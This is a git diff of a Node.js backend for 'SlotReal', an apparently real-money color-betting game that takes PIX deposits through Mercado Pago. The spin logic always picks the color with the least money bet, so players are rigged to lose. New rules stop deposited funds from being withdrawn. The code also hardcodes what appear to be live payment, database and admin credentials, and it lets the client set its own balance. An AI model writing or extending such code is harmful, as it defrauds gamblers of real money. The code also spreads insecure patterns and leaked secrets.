@@ -12,14 +12,15 @@ const MP_TOKEN = "APP_USR-480319563212549-011210-80973eae502f42ff3dfbc0cb456aa93
 const MONGO_URI = "mongodb+srv://SlotReal:A1l9a9n7@cluster0.ap7q4ev.mongodb.net/SlotGame?retryWrites=true&w=majority";
 const SENHA_ADMIN = "76811867";
 
-mongoose.connect(MONGO_URI).then(() => console.log("💎 SLOTREAL CONECTADO - SISTEMA DE 8 CORES"));
+mongoose.connect(MONGO_URI).then(() => console.log("💎 SLOTREAL CONECTADO - REGRAS DE SAQUE ATIVAS"));
 
-// BANCO DE DADOS - AJUSTADO PARA 8 CORES
+// BANCO DE DADOS
 const User = mongoose.models.User || mongoose.model('User', new mongoose.Schema({
     user: { type: String, unique: true },
     pass: String,
     saldo: { type: Number, default: 0.00 },
-    bets: { type: [Number], default: [0,0,0,0,0,0,0,0] } // 8 Cores aqui
+    saldoGanhos: { type: Number, default: 0.00 }, // Apenas este saldo pode ser sacado
+    bets: { type: [Number], default: [0,0,0,0,0,0,0,0] }
 }));
 
 const Stats = mongoose.models.Stats || mongoose.model('Stats', new mongoose.Schema({
@@ -39,20 +40,34 @@ let tempo = 30;
 setInterval(() => { if(tempo > 0) tempo--; else tempo = 30; }, 1000);
 app.get('/api/tempo-real', (req, res) => res.json({ segundos: tempo }));
 
-// SALVAR DADOS
+// SALVAR DADOS (QUANDO O USER CLICA NAS CORES)
 app.post('/api/save-saldo', async (req, res) => {
-    await User.findOneAndUpdate({ user: req.body.user }, { saldo: req.body.saldo, bets: req.body.bets });
+    const u = await User.findOne({ user: req.body.user });
+    if(u) {
+        // Se o usuário gasta saldo para apostar, tiramos proporcionalmente do saldo total
+        await User.findOneAndUpdate({ user: req.body.user }, { 
+            saldo: req.body.saldo, 
+            bets: req.body.bets 
+        });
+    }
     res.json({ success: true });
 });
 
-// GERAR PIX
+// GERAR PIX (DEPÓSITO MÍNIMO 10)
 app.post('/gerar-pix', (req, res) => {
+    const valorDepo = Number(req.body.valor);
+    
+    if(valorDepo < 10) {
+        return res.json({ success: false, msg: "Depósito mínimo é R$ 10" });
+    }
+
     const postData = JSON.stringify({
-        transaction_amount: Number(req.body.valor),
+        transaction_amount: valorDepo,
         description: `Dep_SlotReal_${req.body.user}`,
         payment_method_id: "pix",
         payer: { email: "gerente_vendas@email.com", first_name: req.body.user }
     });
+
     const options = {
         hostname: 'api.mercadopago.com',
         path: '/v1/payments',
@@ -63,6 +78,7 @@ app.post('/gerar-pix', (req, res) => {
             'X-Idempotency-Key': Date.now().toString()
         }
     };
+
     const mpReq = https.request(options, (mpRes) => {
         let b = '';
         mpRes.on('data', d => b += d);
@@ -79,64 +95,83 @@ app.post('/gerar-pix', (req, res) => {
     mpReq.end();
 });
 
-// SOLICITAR SAQUE
+// SOLICITAR SAQUE (MÍNIMO 20 E SÓ DE GANHOS)
 app.post('/api/saque', async (req, res) => {
     const u = await User.findOne({ user: req.body.user });
-    const valor = parseFloat(req.body.valor);
-    if (u && u.saldo >= valor && valor >= 10) {
-        await User.findOneAndUpdate({ user: u.user }, { $inc: { saldo: -valor } });
-        const novo = new Saque({ user: u.user, valor: valor, pix: req.body.pix });
-        await novo.save();
-        res.json({ success: true });
-    } else {
-        res.json({ success: false, msg: "Saldo insuficiente ou valor baixo!" });
+    const valorSaque = parseFloat(req.body.valor);
+
+    if (!u) return res.json({ success: false, msg: "Usuário não encontrado" });
+
+    // REGRAS: Mínimo 20 e deve ter saldoGanhos suficiente
+    if (valorSaque < 20) {
+        return res.json({ success: false, msg: "O saque mínimo é R$ 20,00" });
     }
+
+    if (u.saldoGanhos < valorSaque) {
+        return res.json({ success: false, msg: "Você só pode sacar valores ganhos em jogo!" });
+    }
+
+    // Se passou, desconta de ambos os saldos
+    const novoSaldoTotal = Number((u.saldo - valorSaque).toFixed(2));
+    const novoSaldoGanhos = Number((u.saldoGanhos - valorSaque).toFixed(2));
+
+    await User.findOneAndUpdate(
+        { user: u.user }, 
+        { $set: { saldo: novoSaldoTotal, saldoGanhos: novoSaldoGanhos } }
+    );
+
+    const novoSaque = new Saque({ user: u.user, valor: valorSaque, pix: req.body.pix });
+    await novoSaque.save();
+
+    res.json({ success: true });
 });
 
-// GIRO CONFIGURADO: APOSTA R$ 1,00 -> GANHA R$ 5,00 (5x)
+// GIRO CONFIGURADO
 app.post('/api/spin', async (req, res) => {
     const u = await User.findOne({ user: req.body.user });
     if(!u) return res.json({ success: false });
 
     const totalApostado = u.bets.reduce((a, b) => a + b, 0);
     
-    // Lógica para a banca sempre ganhar: escolhe a cor com menos aposta
     let menor = Math.min(...u.bets);
     let opcoes = [];
     u.bets.forEach((v, i) => { if (v === menor) opcoes.push(i); });
 
     const alvo = opcoes[Math.floor(Math.random() * opcoes.length)];
     
-    // MULTIPLICADOR DE 5x (Apostou 1 ganha 5)
     const ganho = Number((u.bets[alvo] * 5).toFixed(2));
     const lucroRodada = totalApostado - ganho;
 
     await Stats.findOneAndUpdate({}, { $inc: { lucroTotal: lucroRodada } }, { upsert: true });
     
+    // O ganho do jogo vai para o Saldo Total E para o Saldo de Ganhos (Sacável)
     const nS = Number((u.saldo + ganho).toFixed(2));
+    const nSG = Number((u.saldoGanhos + ganho).toFixed(2));
     
-    // Zera as apostas com 8 posições
-    await User.findOneAndUpdate({ user: u.user }, { $set: { saldo: nS, bets: [0,0,0,0,0,0,0,0] } });
+    await User.findOneAndUpdate(
+        { user: u.user }, 
+        { $set: { saldo: nS, saldoGanhos: nSG, bets: [0,0,0,0,0,0,0,0] } }
+    );
 
     res.json({ success: true, corAlvo: alvo, novoSaldo: nS, valorGanho: ganho });
 });
 
-// ADMIN LIST
+// ADMIN E OUTRAS ROTAS...
 app.post('/api/admin/list', async (req, res) => {
     if(req.body.senha !== SENHA_ADMIN) return res.json({ success: false });
-    const users = await User.find({}, 'user saldo');
+    const users = await User.find({}, 'user saldo saldoGanhos');
     const st = await Stats.findOne({});
     const saques = await Saque.find({ status: "Pendente" });
     res.json({ success: true, users, lucroBanca: st ? st.lucroTotal : 0, saques });
 });
 
-// PAGAR SAQUE
 app.post('/api/admin/pagar-saque', async (req, res) => {
     if(req.body.senha !== SENHA_ADMIN) return res.json({ success: false });
     await Saque.findByIdAndDelete(req.body.id);
     res.json({ success: true });
 });
 
+// BÔNUS ADMIN (Não vai para saldoGanhos, logo não é sacável)
 app.post('/api/admin/bonus', async (req, res) => {
     if(req.body.senha !== SENHA_ADMIN) return res.json({ success: false });
     await User.findOneAndUpdate({ user: req.body.user }, { $inc: { saldo: req.body.valor } });
